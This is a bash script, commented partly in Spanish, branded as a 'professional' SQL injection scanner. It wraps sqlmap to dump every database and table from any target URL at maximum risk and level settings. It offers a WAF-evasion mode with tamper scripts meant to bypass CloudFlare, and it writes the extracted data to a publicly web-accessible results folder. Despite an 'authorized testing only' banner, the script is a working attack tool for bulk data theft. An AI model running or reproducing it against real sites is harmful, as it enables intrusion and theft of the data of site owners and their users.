#!/bin/bash
# SANTRIX SQL Injection Scanner v2.1 - PROFESSIONAL VERSION
# AUTHORIZED TESTING ONLY

echo "#################################################"
echo "#                                               #"
echo "#          SANTRIX SQLi Scanner v2.1            #"
echo "#      (PRO PRODUCTION-GRADE TOOL)              #"
echo "#                                               #"
echo "#################################################"
echo ""

# Configuration
RESULT_DIR="public/results"
mkdir -p "$RESULT_DIR"
OUTPUT_FILE="$RESULT_DIR/sql_scan_$(date +%Y%m%d_%H%M%S).txt"
TEMP_OUT="/tmp/sqlmap_out_$(date +%s)"

# Get target and flags
if [ -z "$1" ]; then
    read -p "URL objetivo: " TARGET
    read -p "Datos POST (opcional): " POST_DATA
    read -p "¿Activar modo evasión WAF? (s/n): " WAF_EVADE
else
    TARGET="$1"
    shift
    while [[ "$#" -gt 0 ]]; do
        case $1 in
            --data=*) POST_DATA="${1#*=}"; shift ;;
            --evade) WAF_EVADE="s"; shift ;;
            *) shift ;;
        esac
    done
fi

if [ -z "$TARGET" ]; then
    echo "[!] ERROR: No se proporcionó una URL objetivo."
    exit 1
fi

echo "[+] INICIANDO AUDITORÍA REAL SOBRE: $TARGET"
echo "[+] Fecha: $(date)"

# Check for sqlmap
if ! command -v sqlmap &> /dev/null; then
    echo "[!] CRITICAL ERROR: sqlmap is not installed. Use 'nix install sqlmap'."
    exit 1
fi

echo "[+] Ejecutando extracción de datos completa (Dumping)..."

# Professional sqlmap execution
FLAGS="--batch --risk=3 --level=5 --threads=5 --dbs --tables --dump --random-agent"

if [[ "$WAF_EVADE" == "s" ]]; then
    echo "[!] MODO EVASIÓN ACTIVADO: Usando scripts tamper para saltar CloudFlare..."
    # Scripts específicos para ofuscar payloads y saltar filtros WAF
    FLAGS="$FLAGS --tamper=between,charencode,charunicodeencode,equaltolike,randomcase --hex"
fi

if [ ! -z "$POST_DATA" ]; then
    echo "[+] Enviando carga útil vía POST: $POST_DATA"
    sqlmap -u "$TARGET" --data="$POST_DATA" $FLAGS --output-dir="$TEMP_OUT"
else
    echo "[+] Enviando carga útil vía GET"
    sqlmap -u "$TARGET" $FLAGS --output-dir="$TEMP_OUT"
fi

# Consolidate results into the final .txt file
echo "=== REPORTE DE EXTRACCIÓN SANTRIX ===" > "$OUTPUT_FILE"
echo "OBJETIVO: $TARGET" >> "$OUTPUT_FILE"
echo "FECHA: $(date)" >> "$OUTPUT_FILE"
echo "=====================================" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Find and append all extracted data (CSV exports from sqlmap)
DATA_FOUND=$(find "$TEMP_OUT" -name "*.csv" 2>/dev/null)

if [ -z "$DATA_FOUND" ]; then
    echo "[!] No se extrajeron tablas o el objetivo no es vulnerable." >> "$OUTPUT_FILE"
    echo "[!] No se detectó vulnerabilidad o la extracción fue bloqueada por CloudFlare."
else
    for file in $DATA_FOUND; do
        echo "TABLA: $(basename "$file" .csv)" >> "$OUTPUT_FILE"
        cat "$file" >> "$OUTPUT_FILE"
        echo -e "\n-------------------------------------\n" >> "$OUTPUT_FILE"
    done
    echo "[+] EXTRACCIÓN EXITOSA. Datos consolidados."
fi

# Cleanup temp files
rm -rf "$TEMP_OUT"

echo ""
echo "[+] PROCESO FINALIZADO."
echo "[+] Archivo de resultados: $OUTPUT_FILE"
echo "[+] Acceso web: /results/$(basename "$OUTPUT_FILE")"
